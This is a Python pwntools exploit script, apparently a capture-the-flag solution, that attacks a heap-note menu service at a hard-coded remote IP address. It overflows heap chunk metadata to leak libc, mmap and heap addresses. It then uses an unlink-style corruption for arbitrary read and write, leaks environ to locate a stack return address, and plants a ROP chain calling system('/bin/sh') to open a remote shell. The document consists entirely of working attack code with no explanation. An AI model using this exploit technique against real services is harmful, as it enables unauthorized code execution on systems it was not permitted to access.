from pwn import *
context.arch = "amd64"

io = remote("119.3.158.103",19008)

libc = ELF("./libc.so")
libc.sym["environ"] = 0x7f3d75966fd8-0x7f3d756d2000

def A(size, na, words):
    io.sendlineafter("> ","1")
    io.sendlineafter(" >",str(size))
    io.sendlineafter(" >",na)
    if len(words) == size:
        io.sendafter(" >",words)
    else:
        io.sendlineafter(" >",words)

def D(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter(" >",str(idx))

def T(idx, words):
    io.sendlineafter("> ","3")
    io.sendlineafter(" >",str(idx))
    io.send(words)

def E(idx):
    io.sendlineafter("> ","4")
    io.sendlineafter(" >",str(idx))
    return io.recvuntil("Done")

A(0x60,"N","FFFF")	#0
A(0x60,"N","FFFF")	#1
A(0x60,"N","FFFF")	#2
A(0x60,"N","FFFF")	#3
A(0x60,"N","FFFF")	#4
A(0x60,"N","FFFF")	#5
A(0x60,"N","FFFF")	#6
A(0x60,"N","FFFF")	#7
D(3)
D(5)
D(1)
payload = "H"*0x38+p64(0)*3+p64(0x61)+p64(0x20)+p64(0xdeadbeef)*2+p64(0x70)+p64(0x81)+"F"*8
A(0x38,"Y",payload)	#0
lbase = u64(E(4)[8:14].ljust(8,'\x00'))-(0x7f39fdbefe38-0x7f39fd95d000)
mbase = lbase + (0x7fb0336ec000-0x7fb03345c000)
hbase = lbase + (0x7fb0336ef000-0x7fb03345c000)
success("LIBC BASE -> %#x"%lbase)
success("MMAP BASE -> %#x"%mbase)
success("HEAP BASE -> %#x"%hbase)

T(1,p64(1)+p64(0x71)+p64(mbase+0x18-0x18)+p64(mbase+0x18-0x10)+"\n")
D(4)
T(1,p64(mbase+0x10)+p64(0x4)+p64(0x602034)+p64(8)+p64(lbase+0x294fd8)+"\n")
T(1,p32(0))
environ = u64(E(2)[:6].ljust(8,'\x00'))
success("ENVIRON -> %#x"%environ)

pop_rdi = 0x14862
binsh = 0x91345
predict_ret = environ-(0x7fff17121538-0x7fff171214a0)+8
T(0,p64(0x70)+p64(predict_ret)+"\n")
#gdb.attach(io,'handle SIGALRM nostop noprint\nb *0x400f7f')
T(1,p64(lbase+pop_rdi)+p64(lbase+binsh)+p64(lbase+libc.sym["system"]))
io.interactive()
